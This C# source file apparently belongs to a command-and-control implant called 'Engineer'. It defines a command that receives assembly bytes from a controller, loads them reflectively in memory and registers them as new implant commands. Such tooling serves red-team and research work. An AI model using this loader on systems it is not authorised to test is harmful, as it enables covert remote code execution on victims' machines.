using System;
using System.Reflection;
using System.Threading.Tasks;
using DynamicEngLoading;

namespace Engineer.Commands;

public class AddCommand : EngineerCommand
{
    public override string Name => "AddCommand";
    public override async Task Execute(EngineerTask task)
    {
        try
        {
            var assemblyBytes = task.File;
            if(assemblyBytes == null)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: no file sent", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            }
            else
            {
                var assembly = Assembly.Load(assemblyBytes);
                // Load and execute the EngineerCommand from the received assembly
                foreach (var type in assembly.GetTypes()) // types would be a class in this instance
                {
                    if (type.IsSubclassOf(typeof(EngineerCommand)))  // checks to make sure thing is inside the EngineerCommand class first
                    {
                        var newCommand = (IEngineerCommand)Activator.CreateInstance(type); //returns a class so must be casted to EngineerCommand
                        Program._commands.Add(newCommand); 
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Command {newCommand.Name} added successfully", task, EngTaskStatus.Complete, TaskResponseType.String);
                        return;
                    }
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: no EngineerCommand found in assembly", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            }
        }
        catch (Exception e)
        {
            if (e is ReflectionTypeLoadException typeLoadException)
            {
                foreach (var loaderException in typeLoadException.LoaderExceptions)
                {
                    Console.WriteLine("LoaderException: " + loaderException.Message);
                }
            }
            Console.WriteLine(e.Message);
            Console.WriteLine(e.StackTrace);
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{e.Message}",task,EngTaskStatus.Failed,TaskResponseType.String);
        }
    }

    
}